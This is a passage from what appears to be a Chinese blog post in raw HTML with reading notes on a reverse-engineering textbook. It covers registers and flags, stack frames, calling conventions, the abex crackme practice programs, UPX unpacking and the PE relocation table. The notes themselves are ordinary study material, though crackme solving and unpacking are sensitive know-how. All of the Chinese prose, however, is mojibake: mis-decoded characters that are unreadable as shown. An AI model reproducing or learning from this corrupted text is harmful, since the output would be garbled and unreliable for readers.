alt="image-20200701190155792"></p><p>å¸¸è§çš„ä¸‰ä¸ªï¼š</p><ul><li>ZFï¼šè‹¥è¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™ä¸º0</li><li>OFï¼šæœ‰ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼ŒOFå€¼è¢«ç½®ä¸º1ã€‚æ­¤å¤–ï¼ŒMSB(æœ€é«˜æœ‰æ•ˆä½)æ”¹å˜æ—¶ï¼Œå…¶å€¼ä¹Ÿè¢«è®¾ä¸º1</li><li>CFï¼šæ— ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼Œå…¶å€¼è¢«ç½®ä¸º1</li></ul><p>4.æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆEIPï¼‰ï¼šä¿å­˜ç€CPUè¦æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€ï¼Œæ¯æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤å°±ä¼šé€šè¿‡EIPå¯„å­˜å™¨è¯»å–ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><hr><h2 id="ç¬¬äº”ç« -æ ˆ"><a href="#ç¬¬äº”ç« -æ ˆ" class="headerlink" title="ç¬¬äº”ç«  æ ˆ"></a>ç¬¬äº”ç«  æ ˆ</h2><p>æ ˆï¼šå…¶å®æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒæŒ‰ç…§FILOï¼ˆå…ˆè¿›åå‡ºï¼‰çš„åŸåˆ™å­˜å‚¨æ•°æ®ã€‚ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡ï¼Œä¼ é€’å‡½æ•°å‚æ•°ï¼Œä¿å­˜å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p><p>è¿™é‡Œæ‹¿ä¹‹å‰åœ¨PWNå­¦ä¹ è¿‡ç¨‹ä¸­å¯¹æ ˆå­¦ä¹ åçš„å›¾åšè¡¥å……ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200609114209670-1593603250485.png" alt="image-20200609114209670"></p><hr><h2 id="ç¬¬å…­ç« -åˆ†æabexâ€™-crackme-1"><a href="#ç¬¬å…­ç« -åˆ†æabexâ€™-crackme-1" class="headerlink" title="ç¬¬å…­ç«  åˆ†æabexâ€™ crackme#1"></a>ç¬¬å…­ç«  åˆ†æabexâ€™ crackme#1</h2><ul><li>ä½¿ç”¨VC++ï¼ŒVCï¼ŒDelphiç­‰å¼€å‘å·¥å…·ç¼–å†™çš„ç¨‹åºï¼Œé™¤äº†è‡ªå·±ç¼–å†™çš„ä»£ç å¤–ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†å¯åŠ¨å‡½æ•°ç”±ç¼–è¯‘å™¨æ·»åŠ çš„ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ç¨‹åºï¼Œæ±‡ç¼–ä»£ç ç›´æ¥å˜ä¸ºåæ±‡ç¼–ä»£ç ï¼Œmain()å‡½æ•°ç›´æ¥å‡ºç°åœ¨EPä¸­ã€‚</li><li>GetDriveType()å‡½æ•°ï¼šè·å–Cé©±åŠ¨å™¨çš„ç±»å‹ï¼ˆå¤§éƒ¨åˆ†è¿”å›çš„æ˜¯HDDç±»å‹ï¼‰ã€‚</li><li>æ³¨æ„è°ƒç”¨Win32 APIåï¼ŒæŸäº›ç‰¹å®šå¯„å­˜å™¨çš„å€¼å°±ä¼šæ”¹å˜ã€‚</li></ul><hr><h2 id="ç¬¬ä¸ƒç« -æ ˆå¸§"><a href="#ç¬¬ä¸ƒç« -æ ˆå¸§" class="headerlink" title="ç¬¬ä¸ƒç«  æ ˆå¸§"></a>ç¬¬ä¸ƒç«  æ ˆå¸§</h2><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><ul><li><p>æ ˆå¸§ï¼šåˆ©ç”¨EBPï¼ˆæ ˆå¸§æŒ‡é’ˆï¼‰å¯„å­˜å™¨è®¿é—®æ ˆå†…çš„å±€éƒ¨å˜é‡ï¼Œå‚æ•°ï¼Œå‡½æ•°è¿”å›åœ°å€çš„æ‰‹æ®µã€‚</p></li><li><p>å‡½æ•°å¼€å§‹æ—¶ï¼Œä¼šå…ˆé€šè¿‡<code>push ebp;mov ebp, esp;</code>ç”Ÿæˆä¸å…¶å¯¹åº”çš„æ ˆå¸§ã€‚å‡½æ•°ç»“æŸæ—¶ä¼šé€šè¿‡<code>mov esp, ebp;pop ebp;ï¼ˆleaveï¼‰</code>åˆ é™¤æ ˆå¸§ã€‚</p></li><li><p>æœ€æ–°çš„ç¼–è¯‘å™¨éƒ½æœ‰ä¸€ä¸ªä¼˜åŒ–é€‰é¡¹ï¼Œä½¿ç”¨è¯¥é€‰é¡¹ç¼–è¯‘ç®€å•çš„å‡½æ•°å°†ä¸ä¼šäº§ç”Ÿæ ˆå¸§ã€‚</p></li></ul><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><p>å‡½æ•°ä¸­å±€éƒ¨å˜é‡ä½¿ç”¨sub esp xxï¼›å¼€è¾Ÿç©ºé—´ï¼›å‡½æ•°ç»“æŸåï¼Œå‚æ•°ä¼ é€’ä½¿ç”¨çš„æ ˆç©ºé—´ä½¿ç”¨add esp xxï¼›è¿›è¡Œæ¸…ç†ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190509071.png" alt="image-20200702190509071"></p></li><li><p>åœ¨æ ˆçª—å£ä¸­ï¼Œç‚¹å‡»é¼ æ ‡å³é”®ï¼Œé€‰æ‹©åœ°å€åå¯ä»¥é€‰æ‹©æ ˆç›¸å¯¹äºé‚£ä¸ªå¯„å­˜å™¨çš„åç§»æ¥æ˜¾ç¤ºï¼Œå¯ä»¥è®©æ ˆç©ºé—´æ›´ç›´è§‚ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190825336.png" alt="image-20200702190825336"></p></li><li><p>å¯¹äºåŸæ¥ä»¥EBPè¡¨ç¤ºçš„å‡½æ•°å±€éƒ¨å˜é‡ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨å¿«æ·é”®<strong>alt+o</strong>ï¼Œç„¶åé€‰æ‹©åˆ†æ1ï¼Œå°†<strong>æ˜¾ç¤ºå‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ä¸å‚æ•°</strong>çš„é€‰é¡¹å‹¾ä¸Šã€‚é‚£æˆ‘ä»¬çš„åœ¨ODä¸­çœ‹åˆ°çš„å±€éƒ¨å˜é‡å°†ä¼šè¢«è¡¨ç¤ºæˆï¼šLOCAL.nï¼Œå‚æ•°è¡¨ç¤ºæˆï¼šARG.nã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702191428951.png" alt="image-20200702191428951"></p></li><li><p>å‡½æ•°è°ƒç”¨è§„åˆ™ï¼šcdeclï¼šå‡½æ•°è°ƒç”¨è€…ï¼ˆCallerï¼‰è´Ÿè´£æ¸…ç†å‚¨å­˜åœ¨æ ˆä¸­çš„å‚æ•°ã€‚</p><p>â€‹                          stdcallï¼šè¢«è°ƒç”¨è€…ï¼ˆCalleeï¼‰è´Ÿè´£æ¸…ç†ä¿å­˜åœ¨æ ˆä¸­çš„å‚æ•°ã€‚</p></li><li><p>XORå‘½ä»¤ï¼šå¼‚æˆ–è¿ç®—ï¼Œç”±äºXORå‘½ä»¤æ¯”MOV EAXï¼Œ0å‘½ä»¤æ‰§è¡Œé€Ÿåº¦å¿«ï¼Œæ‰€ä»¥å¸¸ç”¨äºå¯„å­˜å™¨åˆå§‹åŒ–æ“ä½œã€‚</p></li></ul><hr><h2 id="ç¬¬å…«ç« -abexâ€™-crackme-2"><a href="#ç¬¬å…«ç« -abexâ€™-crackme-2" class="headerlink" title="ç¬¬å…«ç«  abexâ€™ crackme #2"></a>ç¬¬å…«ç«  abexâ€™ crackme #2</h2><p>ç¬¬ä¸€æ¬¡åˆ†ævbå†™çš„ç¨‹åºï¼Œå¼€å§‹å¾ˆä¸é€‚åº”ï¼Œåé¢ä»å¯¹è±¡å‡ºå‘è¿˜æ˜¯å¥½å¾ˆå¤šï¼Œä½†å§‹ç»ˆè¿˜æ˜¯ä¸å¦‚VCå†™çš„ç®€å•ï¼Œè¿˜æ˜¯è‡ªå·±èƒ½åŠ›ä¸å¤Ÿã€‚</p><h3 id="VBç¼–å†™ç¨‹åºçš„ä»‹ç»"><a href="#VBç¼–å†™ç¨‹åºçš„ä»‹ç»" class="headerlink" title="VBç¼–å†™ç¨‹åºçš„ä»‹ç»"></a>VBç¼–å†™ç¨‹åºçš„ä»‹ç»</h3><p>äº‹ä»¶å¤„ç†ç¨‹åºï¼šVBä¸»è¦ç”¨æ¥ç¼–å†™GUIç¨‹åºã€‚ç”±äºVBç¨‹åºé‡‡ç”¨windowsæ“ä½œç³»ç»Ÿçš„ç³»ç»Ÿçš„äº‹ä»¶é©±åŠ¨æ–¹å¼å·¥ä½œï¼Œæ‰€ä»¥åœ¨main()æˆ–WinMain()ä¸­å¹¶ä¸å­˜åœ¨ç”¨æˆ·ä»£ç (å³æˆ‘ä»¬å¸Œæœ›è°ƒè¯•çš„ä»£ç )ï¼Œç”¨æˆ·ä»£ç å­˜åœ¨äºå„ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºä¸­ã€‚</p><p>æœªæ–‡æ¡£åŒ–çš„ç»“æ„ä½“ï¼šVBä¸­ä½¿ç”¨çš„å„ç§ä¿¡æ¯ä»¥ç»“æ„ä½“å½¢å¼ä¿å­˜åœ¨æ–‡ä»¶å†…éƒ¨ã€‚ç”±äºå¾®è½¯æœªæ­£å¼å…¬å¼€è¿™ç§ç»“æ„ä½“ä¿¡æ¯ï¼Œæ‰€ä»¥è°ƒè¯•VBæ–‡ä»¶ä¼šéš¾ä¸€äº›ã€‚</p><h3 id="åˆ†æç¨‹åº"><a href="#åˆ†æç¨‹åº" class="headerlink" title="åˆ†æç¨‹åº"></a>åˆ†æç¨‹åº</h3><p>é¦–å…ˆè°ƒç”¨VBå¼•æ“ä¸»å‡½æ•°ï¼ˆThunRTMainï¼‰<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704125816635.png" alt="image-20200704125816635"></p><p>è¿™é‡Œç›´æ¥ä»äº‹ä»¶å¤„ç†ç¨‹åºå¼€å§‹<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141338867.png" alt="image-20200704141338867"></p><p>è·å–è¾“å…¥çš„nameå­—ç¬¦ä¸²<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141442295.png" alt="image-20200704141442295"></p><p>é•¿åº¦æ¯”è¾ƒ<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141501224.png" alt="image-20200704141501224"></p><p>ä½¿ç”¨nameç”Ÿæˆå¯†ç <img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141533793.png" alt="image-20200704141533793"></p><p>æœ€åï¼Œæ¯”è¾ƒå¯†ç <img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141550425.png" alt="image-20200704141550425"></p><p>éš¾ç‚¹ï¼šç¨‹åºä¸­å¤„ç†çš„æ¯ä¸ªæ•°æ®éƒ½æ˜¯å¯¹è±¡ï¼Œè°ƒè¯•æ—¶ä¸æ˜“çœ‹ï¼Œä¸”ç¨‹åºä¸­å‡½æ•°å¤ªå¤šã€‚</p><hr><h2 id="ç¬¬ä¹ç« -Process-Explorer"><a href="#ç¬¬ä¹ç« -Process-Explorer" class="headerlink" title="ç¬¬ä¹ç«  Process Explorer"></a>ç¬¬ä¹ç«  Process Explorer</h2><p>ç§¯ç´¯ä¸€ä¸ªæ–°å·¥å…·ï¼šè¿›ç¨‹ç®¡ç†ã€‚</p><p>å¯ä»¥æ˜¾ç¤ºç”µè„‘ä¸­è¿è¡Œæ¯ä¸ªè¿›ç¨‹å“¦PIDï¼ŒCPUå æœ‰ç‡ï¼Œæ³¨å†Œä¿¡æ¯ï¼Œç»ˆæ­¢è¿›ç¨‹ã€‚</p><hr><h2 id="ç¬¬åç« -å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#ç¬¬åç« -å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="ç¬¬åç«  å‡½æ•°è°ƒç”¨çº¦å®š"></a>ç¬¬åç«  å‡½æ•°è°ƒç”¨çº¦å®š</h2><p>ä¸‰ç§ä¸»è¦çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼šcdeclï¼ˆCè¯­è¨€é»˜è®¤è°ƒç”¨ï¼‰ï¼Œstdcallï¼ˆä½¿ç”¨_stdcallå…³é”®å­—æ¥ä½¿ç”¨stdcallæ–¹å¼ç¼–è¯‘ï¼‰ï¼Œfastcall</p><p>å®ƒä»¬é€šè¿‡æ ˆæ¥ä¼ é€’å‚æ•°çš„æ–¹å¼éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨äºæ¸…ç†æ ˆçš„è¿‡ç¨‹ã€‚</p><p>cdeclï¼šå‡½æ•°è°ƒç”¨è€…æ¸…ç†å‹å…¥æ ˆçš„å‚æ•°ã€‚åœ¨è°ƒç”¨å‡½æ•°ä¹‹åé€šè¿‡ï¼šadd esp xxx;</p><p>stdcallï¼šè¢«è°ƒç”¨è€…æ¸…ç†æ ˆã€‚å¦‚RETN 8;å‘½ä»¤ï¼Œå®ƒçš„å«ä¹‰å°±æ˜¯ï¼šRETN+POP 8å­—èŠ‚ï¼Œè¿”å›åä½¿espå¢åŠ æŒ‡å®šå¤§å°ã€‚ï¼ˆWin 32 API ä½¿ç”¨stdcallæ–¹å¼ï¼Œè¿™ä¸ªæ–¹å¼å¯ä»¥è·å¾—æ›´å¥½çš„å…¼å®¹æ€§ï¼Œä½¿Cè¯­è¨€ä¹‹å¤–çš„å…¶ä»–è¯­è¨€ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨APIï¼‰</p><p>fastcallï¼šå‰2ä¸ªå‚æ•°ä¼šä½¿ç”¨ECXä¸EDXå¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œå®ç°å¯¹å‡½æ•°çš„å¿«é€Ÿè°ƒç”¨ã€‚å…¶ä»–ä¸stdcallç›¸ä¼¼ã€‚</p><hr><h2 id="ç¬¬åä¸€ç« -è§†é¢‘è®²åº§"><a href="#ç¬¬åä¸€ç« -è§†é¢‘è®²åº§" class="headerlink" title="ç¬¬åä¸€ç«  è§†é¢‘è®²åº§"></a>ç¬¬åä¸€ç«  è§†é¢‘è®²åº§</h2><p>æ”¶è·ä¸¤ç‚¹ï¼š1.æŸ¥çœ‹ä¼ å…¥ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚2.negæŒ‡ä»¤ä¸sbbæŒ‡ä»¤ã€‚</p><p>1.æŸ¥çœ‹ä¼ å…¥å‡½æ•°å‚æ•°ä¸ªæ•°ï¼šé¦–å…ˆåˆ¤æ–­å‡½æ•°è°ƒç”¨çº¦å®šï¼Œå†åœ¨å‡½æ•°è°ƒç”¨å‰åæŸ¥çœ‹æ ˆæƒ…å†µå³å¯ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203210059.png" alt="image-20200704203210059"></p><p>å‡½æ•°è°ƒç”¨åï¼Œä¸¤æ¬¡çš„espåªå·®å³ä¸ºä½¿ç”¨æ ˆç©ºé—´ä¼ é€’å‚æ•°å¤§å°ã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203311197.png" alt="image-20200704203311197"></p><p>2.negæŒ‡ä»¤çš„æ“ä½œå¯¹è±¡æ˜¯0åˆ™CF=0ï¼Œå¦åˆ™CF=1<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203750309.png" alt="image-20200704203750309"></p><hr><h2 id="ç¬¬åä¸‰ç« -PEæ–‡ä»¶æ ¼å¼"><a href="#ç¬¬åä¸‰ç« -PEæ–‡ä»¶æ ¼å¼" class="headerlink" title="ç¬¬åä¸‰ç«  PEæ–‡ä»¶æ ¼å¼"></a>ç¬¬åä¸‰ç«  PEæ–‡ä»¶æ ¼å¼</h2><p>ä¹‹å‰å·²ç»å­¦ä¹ æ€»ç»“åœ¨å¦ä¸€ä¸ªå¸–å­ï¼š<strong><a href="http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/">http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</a></strong></p><hr><h2 id="ç¬¬åäº”ç« -è°ƒè¯•UPXå‹ç¼©çš„notepadç¨‹åº"><a href="#ç¬¬åäº”ç« -è°ƒè¯•UPXå‹ç¼©çš„notepadç¨‹åº" class="headerlink" title="ç¬¬åäº”ç«  è°ƒè¯•UPXå‹ç¼©çš„notepadç¨‹åº"></a>ç¬¬åäº”ç«  è°ƒè¯•UPXå‹ç¼©çš„notepadç¨‹åº</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>GetModuleHandleA()å‡½æ•°ï¼šè·å–ç¨‹åºçš„imagebaseã€‚</li></ul><ul><li>GetProcAdress()å‡½æ•°ï¼šä»EATä¸­è·å–æŒ‡å®šåç§°çš„APIçš„å®é™…åœ°å€ã€‚</li></ul><ul><li>pushadå‘½ä»¤ï¼šå°†8ä¸ªé€šç”¨å¯„å­˜å™¨ï¼ˆEAX-EDIï¼‰çš„å€¼ä¿å­˜åˆ°æ ˆï¼›popadæ˜¯å°†æ ˆä¸­çš„å„ä¸ªå€¼å†æ¬¡å›å¤åˆ°å„ä¸ªå¯„å­˜å™¨ã€‚</li></ul><ul><li>åœ¨å†…å­˜å¤åˆ¶å‘½ä»¤ä¸­ï¼ŒESIæŒ‡Sourceï¼ŒEDIæŒ‡Destinationã€‚è°ƒè¯•æ—¶ï¼ŒåŒæ—¶è®¾ç½®ESIä¸EDIæ—¶å°±åº”è¯¥çŒœæƒ³ä»ESIæ‰€æŒ‡ç¼“å†²åŒºåˆ°EDIæ‰€æŒ‡ç¼“å†²åŒºçš„å†…å­˜å‘ç”Ÿå¤åˆ¶ã€‚</li></ul><ul><li>ctrl+f11ï¼šåå¤æ‰§è¡Œstep intoï¼Œctrl+f12ï¼šåå¤æ‰§è¡Œstep overï¼ˆéƒ½æ˜¯ä¸æ˜¾ç¤ºç”»é¢ï¼‰</li></ul><ul><li>è„±å£³åä¿®æ­£IATçš„åŸå› ï¼šå‹ç¼©åï¼Œæ–‡ä»¶INT(è®°å½•APIåç§°ï¼Œåºæ•°)å·²ç»æŸåã€‚</li></ul><h3 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h3><p>1.ä»ä¸€ä¸ªå¾ªç¯ä¸€ä¸ªå¾ªç¯çš„è·³å‡ºè§£å‹ç¼©è¿‡ç¨‹æœ€åæ‰¾åˆ°EPã€‚</p><p>2.åˆ©ç”¨å †æ ˆå¹³è¡¡çš„åŸç†ï¼Œåœ¨ç¨‹åºåˆšå¼€å§‹çš„çš„espå¤„çš„æ•°æ®ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼ŒF9æ‰§è¡Œï¼Œæ–­ä¸‹çš„åœ°æ–¹å³æ˜¯è§£å‹ç¼©å®Œæˆçš„åœ°æ–¹ã€‚</p><p>æ–­ç‚¹-&gt;ç¡¬ä»¶è®¿é—®-&gt;å­—èŠ‚</p><h2 id="ç¬¬åå…­ç« -åŸºå€é‡å®šä½è¡¨"><a href="#ç¬¬åå…­ç« -åŸºå€é‡å®šä½è¡¨" class="headerlink" title="ç¬¬åå…­ç«  åŸºå€é‡å®šä½è¡¨"></a>ç¬¬åå…­ç«  åŸºå€é‡å®šä½è¡¨</h2><h3 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>PEæ–‡ä»¶åœ¨é‡å®šä½è¿‡ç¨‹ä¸­ç”¨åˆ°åŸºå€é‡å®šä½è¡¨ã€‚</p><p>å½“å‘è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜åŠ è½½PEæ–‡ä»¶ï¼ˆEXE/DLL/SYSï¼‰æ—¶ï¼Œæ–‡ä»¶ä¼šè¢«åŠ è½½åˆ°PEå¤´çš„imagebaseæ‰€æŒ‡çš„åœ°å€å¤„ï¼Œè‹¥åŠ è½½çš„æ˜¯DLL(SYS)æ–‡ä»¶ä¸”åœ¨imagebaseä½ç½®å¤„å·²ç»åŠ è½½äº†DLL(SYS)æ–‡ä»¶ï¼Œé‚£ä¹ˆPEè£…è½½å™¨å°±ä¼šå°†å…¶åŠ è½½åˆ°å…¶ä»–æœªè¢«å ç”¨çš„ç©ºé—´ï¼Œè¿™å°±ä¼šå¼•èµ·ä¸€ç³»åˆ—é‡å®šä½é—®é¢˜ã€‚</p><p>åˆ›å»ºå¥½è¿›ç¨‹ï¼ŒEXEæ–‡ä»¶ä¼šé¦–å…ˆåŠ è½½åˆ°å†…å­˜ï¼Œæ‰€ä»¥EXEæ–‡ä»¶æ— éœ€è€ƒè™‘é‡å®šä½é—®é¢˜ï¼Œä½†windows vistaä¹‹åçš„ç‰ˆæœ¬å¼•å…¥äº†ASLRçš„å®‰å…¨æœºåˆ¶ã€‚</p><h3 id="åŸºå€é‡å®šä½è¡¨"><a href="#åŸºå€é‡å®šä½è¡¨" class="headerlink" title="åŸºå€é‡å®šä½è¡¨"></a>åŸºå€é‡å®šä½è¡¨</h3><p>PEå¤´çš„DataDirectory[5]è®°å½•äº†å®ƒçš„RVAä¸SIZEã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAdress; <span class="comment">//ä¸€ä¸ªåŸºå‡†åœ°å€ï¼ˆæ¯ä¸ªå—çš„åŸºå€ä¸åŒï¼‰</span></span><br><span class="line">    DWORD SizeOfBlock; <span class="comment">//å—çš„å¤§å°</span></span><br><span class="line">  <span class="comment">//WORD TypeOffset][1]; åœ¨æ¯ä¸ªå—ç»“æ„ä½“åå‡ºç°çš„wordå‹æ•°ç»„ã€‚</span></span><br><span class="line">  <span class="comment">//æ•°ç»„ä¸­æ¯ä¸ªå€¼åŠ ä¸Šä¸Šé¢åŸºå€å°±æ˜¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­çš„åœ°å€åç§»ã€‚</span></span><br><span class="line">  <span class="comment">//æ•°ç»„ä¸­æ¯ä¸ªå€¼çš„å‰4ä½è¡¨ç¤ºï¼šç±»å‹ï¼›å12ä½è¡¨ç¤ºï¼šåç§»</span></span><br><span class="line">&#125;IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>ä»¥æŸ¥çœ‹notepadç¨‹åºçš„é‡å®šä½è¡¨ä¸ºä¾‹ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705203510640.png" alt="image-20200705203510640"></p><h3 id="ç¨‹åºå®ä¾‹åˆ†æ"><a href="#ç¨‹åºå®ä¾‹åˆ†æ" class="headerlink" title="ç¨‹åºå®ä¾‹åˆ†æ"></a>ç¨‹åºå®ä¾‹åˆ†æ</h3><p>å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºä¸­çš„å†…å­˜åœ°å€ä»¥ç¡¬ç¼–ç å½¢å¼å­˜åœ¨ï¼Œå¦‚æœåŠ è½½çš„åŸºåœ°å€ä¸åŒåˆä¸è¿›è¡Œé‡å®šä½ï¼Œç¨‹åºå°†å†…å­˜åœ°å€å¼•ç”¨é”™è¯¯é€€å‡ºã€‚<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705184742277.png" alt="image-20200705184742277"></p><blockquote><p>é‡å®šä½æ“ä½œçš„åŸºæœ¬æ“ä½œåŸç†</p><p><strong>åœ¨åº”ç”¨ç¨‹åºä¸­æŸ¥æ‰¾ç¡¬ç¼–ç çš„åœ°å€ä½ç½®</strong></p><p><strong>è¯»å–å€¼åï¼Œå‡å»imagebaseï¼ˆVA-&gt;RVAï¼‰</strong></p><p><strong>åŠ ä¸Šå®é™…åŠ è½½çš„åœ°å€ï¼ˆRVA-&gt;VAï¼‰</strong></p></blockquote><p>æ‰¾åˆ°ç¬¬ä¸€ä¸ªç¡¬ç¼–ç ä½ç½®ï¼š<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204042726.png" alt="image-20200705204042726"></p><p>åŠ è½½ODï¼ŒæŸ¥çœ‹æŒ‡å®šRVA:<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204651976-1600246974741.png" alt="image-20200705204651976"></p><p>è¿™é‡Œç»è¿‡çš„è¿‡ç¨‹ï¼šï¼ˆ1ï¼‰ç”±äºimagebaseä¸ºï¼š<strong>1000000</strong>ï¼Œæ‰€ä»¥å¼€å§‹è¯»åˆ°çš„å€¼ä¸ºï¼š<strong>10010C4</strong>ï¼Œï¼ˆ2ï¼‰å‡å»imagebaseï¼š<strong>10010C4-1000000 = 10C4</strong>ï¼Œï¼ˆ3ï¼‰åŠ ä¸Šå®é™…çš„åŠ è½½åŸºåœ°å€ï¼š<strong>10C4+F20000 = F210C4</strong></p><p>ä¸€ç›´é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°TypeOffsetçš„å€¼ä¸º0ï¼Œåˆ™è¡¨æ˜ä¸€ä¸ªç»“æ„ä½“å—ç»“æŸã€‚å¯¹æ‰€æœ‰ç»“æ„ä½“å—å¦‚æ­¤ï¼Œç›´åˆ°é‡åˆ°NULLï¼ˆå³æœ€åä¸€ä¸ªç»“æ„ä½“ä»¥NULLç»“æŸï¼‰ã€‚</p><hr><h2 id="ç¬¬äºŒåç« -â€œå†…åµŒè¡¥ä¸ç»ƒä¹ â€"><a href="#ç¬¬äºŒåç« -â€œå†…åµŒè¡¥ä¸ç»ƒä¹ â€" class="headerlink" title="ç¬¬äºŒåç«  â€œå†…åµŒè¡¥ä¸ç»ƒä¹ â€"></a>ç¬¬äºŒåç«  â€œå†…åµŒè¡¥ä¸ç»ƒä¹ â€</h2><h3 id="ä»‹ç»-4"><a 